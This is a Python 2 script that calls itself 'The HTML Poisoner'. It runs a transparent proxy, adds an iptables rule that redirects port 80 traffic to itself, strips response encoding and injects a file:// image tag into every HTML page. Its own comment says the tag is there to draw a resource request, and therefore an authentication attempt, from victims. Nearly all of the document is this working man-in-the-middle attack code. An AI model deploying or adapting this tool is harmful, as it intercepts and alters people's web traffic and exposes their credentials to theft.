#!/usr/bin/env python

HOST = "0.0.0.0"
PORT = 3128
VERBOSE = True
TESTING = True
VERBOSETESTING = False
MAX_CONN = 50
BUFFER_SIZE = 8192
SOCKET_TIMEOUT = 2

TESTING_FILE_RxRequest = 'HTMLpoisoner.clientreq.raw'
TESTING_FILE_RxResponse = 'HTMLpoisoner.clientres.raw'
TESTING_FILE_TxRequest = 'HTMLpoisoner.serverreq.raw'
TESTING_FILE_TxResponse = 'HTMLpoisoner.serverres.raw'

import socket, sys, re, os
from thread import *


def acceptConnection(connection, RxConnectionNum):
    data = connection.recv(BUFFER_SIZE)
    if VERBOSETESTING:
        print 'Client sent ' + str(len(data)) + ' bytes (RxConn=' + str(RxConnectionNum) + ')'
    return str(data)


def cleanup():
    try:  # delete the smb.bin file if it exists - this is used for raw connection testing
        os.remove(TESTING_FILE_RxRequest)
        os.remove(TESTING_FILE_RxResponse)
        os.remove(TESTING_FILE_TxRequest)
        os.remove(TESTING_FILE_TxResponse)
    except:
        pass


def connectionHandler(RxConnection, RxRequest, RxAddress, RxConnectionNum):
    RxHeaders = getHeaders(RxRequest, RxConnectionNum, RxAddress[0])
    # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
    if RxHeaders == False:
        sendBanner(RxConnection, RxConnectionNum)
    connectionString = getConnectionString(RxHeaders, RxConnectionNum, RxAddress[0])

    TxRequest = weakenRequest(RxRequest, RxConnectionNum, RxAddress[0], RxHeaders['Host'])

    # Connect to real web server
    TxSocket = createSocketTx(connectionString, RxConnectionNum)
    # Send data to real web server if connection to server was possible
    if TxSocket != False:
        TxSocket.send(TxRequest)
        TxResponse = ''

        while True:
            # get TxResponse response
            try:
                TxResponse += TxSocket.recv(BUFFER_SIZE)
                if VERBOSETESTING:
                    print 'Data received from server (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
                # if the response exists process it, otherwise don't
                if len(TxResponse) == 0:
                    if TESTING:
                        print 'Either null response or EOF from server detected' + ' (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
            except socket.timeout:
                break
        TxSocket.close()

        if VERBOSETESTING:
            print 'Server sent ' + str(len(TxResponse)) + ' bytes (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
        RxResponse = weakenResponse(TxResponse, RxConnectionNum, RxAddress[0], RxHeaders['Host'])
        try:
            RxConnection.send(RxResponse)
        except socket.error as errMsg:
            print 'Looks like client closed connection before we told them to: ' + str(errMsg) + ' (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(
                RxConnectionNum) + ')'
        if VERBOSETESTING:
            print 'Server response sent to proxy client at ' + str(RxAddress) + ' (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'


def createSocketTx(connectionString, RxConnectionNum):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.settimeout(SOCKET_TIMEOUT)
        ServerSocket.connect((connectionString['host'], int(connectionString['port'])))
        return ServerSocket
    except socket.error as errMsg:
        print "[!] Failed to connect to server (" + connectionString['transport'] + "://" + connectionString[
            'host'] + ":" + str(connectionString['port']) + "/" + connectionString['URI'] + ")\n" + str(errMsg) + ' (RxConn=' + str(RxConnectionNum) + ')'
        return False


def createSocketRx(host, port):
    try:
        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # attempt to avoid socket lock problems
        if VERBOSE:
            print "Socket build complete (" + host + ":" + str(port) + ")"
    except socket.error as errMsg:
        print "[!] Failed to build socket (" + host + ":" + str(port) + ")\n" + str(errMsg)
        sys.exit(2)
    try:
        ServerSocket.bind((host, port))
        ServerSocket.listen(MAX_CONN)
        if VERBOSE:
            print "Socket bind complete (" + host + ":" + str(port) + ")"
    except socket.error as errMsg:
        print "[!] Failed to bind socket (" + host + ":" + str(port) + ")\n" + str(errMsg)
        sys.exit(2)
    return ServerSocket


def getConnectionString(RxHeaders, RxConnectionNum, RxAddress):
    # Example HeaderOne value:
    # GET http://www.google.com:8080/path/to/resource/index.php?q=example HTTP/1.1
    # the below splits the above into its component parts and creates a dictionary
    # from example should result in: "GET"
    try:
        method = RxHeaders['Req'].split(' ')[0]
        if TESTING:
            print "Method: " + method + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
        # transparent proxies won't include the host in the request, test for this here:
        if '://' in RxHeaders['Req'].split(' ')[1]:
            # from example should result in: "http"
            transport = RxHeaders['Req'].split(' ')[1].split('://')[0]
            if TESTING:
                print "Transport: " + transport + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
            # from example should result in: "www.google.com:8080"
            hostAndPort = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[0]
            if TESTING:
                print "Host and Port: " + hostAndPort + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
            try:
                # from example should result in: "8080" (do this first to trigger the except earlier)
                port = hostAndPort.split(':')[1]
                if TESTING:
                    print "Port: " + str(port) + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
                # from example should result in: "www.google.com"
                host = hostAndPort.split(':')[0]
                if TESTING:
                    print "Host: " + host + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
            except IndexError:
                # from example should result in: "www.google.com"
                host = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[0]
                if TESTING:
                    print "Host: " + host + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
                port = 80
                if TESTING:
                    print "Port: " + str(port) + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
            URI = '/' + RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[1]
            if TESTING:
                print "URI: " + URI + ' (SrcAdd=' + RxAddress + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
        else:
            # if this is triggered it means transparent proxy so have to make assumptions for below values
            transport = 'http'
            host = RxHeaders['Host']
            port = 80
            URI = RxHeaders['Req'].split(' ')[1]
            if TESTING:
                print 'Transport: ' + transport + '\nHost: ' + host + '\nPort: ' + str(port) + '\nURI: ' + URI + ' (SrcAdd=' + RxAddress + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'

    except IndexError as ErrMsg:
        print 'RxHeaders issue detected: ' + str(ErrMsg) + "\n" + RxHeaders['Req'] + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
        sys.exit(2)
    connString = {'method': method, 'transport': transport, 'host': host, 'port': port, 'URI': URI}
    return connString


def getHeaders(RxRequest, RxConnectionNum, RxAddress):
    # Split out the data section from the headers / preamble
    HTTPData = RxRequest.split("\r\n\r\n", 1)
    # Split each line
    HTTPHeadersList = HTTPData[0].split("\r\n")
    try:
        # First line is the HTTP method and request
        HTTPHeadersDict = {'Req': HTTPHeadersList[0]}
        # The rest are colon separated headers and can be turned into a dictionary
        headerIndex = 0
        for header in HTTPHeadersList:
            if headerIndex > 0:
                headerParts = header.split(":", 1)
                HTTPHeadersDict[headerParts[0]] = str(headerParts[1]).replace(' ','')
            headerIndex += 1
        if VERBOSETESTING:
            print str(HTTPHeadersDict) + ' (SrcAdd=' + RxAddress + ' DstHost='+ HTTPHeadersDict['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
        return HTTPHeadersDict
    except IndexError:
        return False


# get the thing up and running
def main():
    # make sure no previous TESTING raw file captures are present
    cleanup()
    # create the lsitening socket for the transparent proxy
    RxSocket = createSocketRx(HOST, PORT)
    # once the receiving socket is setup, change the IPTABLES rules to redirect port 80 to the transparent proxy
    os.system('iptables -A PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
    # to aid bug hunting, track each connection, initialise the first value
    RxConnectionNum = 0

    # always try and keep a socket listening
    while True:
        # allow connections to be made to the Rx socket
        RxConnection, RxAddress = RxSocket.accept()
        # receive data from the RxSocket
        RxRequest = acceptConnection(RxConnection, RxConnectionNum)
        # for testing purposes, dump data to disk
        if TESTING:
            writeRawData(RxRequest, TESTING_FILE_RxRequest, RxConnectionNum)
        # print connection details to screen to show activity
        if VERBOSETESTING:
            print "Connection from: " + RxAddress[0] + ":" + str(RxAddress[1])
        # when new connections are received, spawn a new thread to handle it
        start_new_thread(connectionHandler, (RxConnection, RxRequest, RxAddress, RxConnectionNum))
        # increment connection counter (for bug hunting)
        RxConnectionNum += 1
        #RxSocket.close


def sendBanner(connection, RxConnectionNum):
    connection.send("The HTML Poisoner at your service ma'am...")
    if TESTING:
        print "Irrelevant connection detected: service banner sent " + ' (RxConn=' + str(RxConnectionNum) + ')'


def weakenRequest(RxRequest, RxConnectionNum, RxAddress, RxHeaderHost):
    # Make sure the web server knows that encoding would cause us trouble by telling it that we don't want any
    TxRequest = re.sub(r'\r\nAccept-Encoding:.*\r\n', '\r\nAccept-Encoding: none\r\n', RxRequest)
    if VERBOSE and 'Accept-Encoding: none' in TxRequest:
        print '[+] Client request weakened' + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
    elif VERBOSE:
        print '[!] Client request NOT weakened' + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
    if VERBOSETESTING:
        print TxRequest + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
        writeRawData(TxRequest, TESTING_FILE_TxRequest, RxConnectionNum)
    return TxRequest


def weakenResponse(TxResponse, RxConnectionNum, RxAddress, RxHeaderHost):  # Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
    if  '</body>' in TxResponse:
        RxResponse = TxResponse.replace('</body>', '<img src="file://htmlinject/random.jpg" alt="" /></body>')
    elif '</BODY>' in TxResponse:
        RxResponse = TxResponse.replace('</BODY>', '<img src="file://htmlinject/random.jpg" alt="" /></BODY>')
    else:
        RxResponse = TxResponse

    if '<img src="file://htmlinject/random.jpg" alt="" />' in RxResponse:
        if VERBOSE:
            print "[+] HTML poisoning performed" + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
        # Recalculate the size of the request as close as possible
        RxResponseNewLength = len(str(RxResponse)) + len(str(len(str(RxResponse))))
        # Insert new length into RxResponse
        RxResponse = re.sub(r'\r\nContent-Length:.*\r\n', '\r\nContent-Length: ' + str(RxResponseNewLength) + '\r\n',
                            RxResponse)
    elif VERBOSETESTING:
        print '[!] No HTML poisoning achieved' + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
    if TESTING:
        writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnectionNum)
    return RxResponse


def writeRawData(data, filename, RxConnectionNum):
    if VERBOSETESTING:
        print 'Attempting to write raw data to disk (' + filename + ') for testing purposes' + ' (RxConn=' + str(RxConnectionNum) + ')'
    outputFile = open(filename, "ab")
    outputFile.write('\r\n\r\n(RxConn=' + str(RxConnectionNum) + ')\r\n' + data)
    outputFile.close()


if __name__ == '__main__':
    try:
        main()
    # attempt, though don't hold your breath, to shutdown gracefully when told to do so
    except KeyboardInterrupt:
        print 'User signaled exit...'
        os.system('iptables -D PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)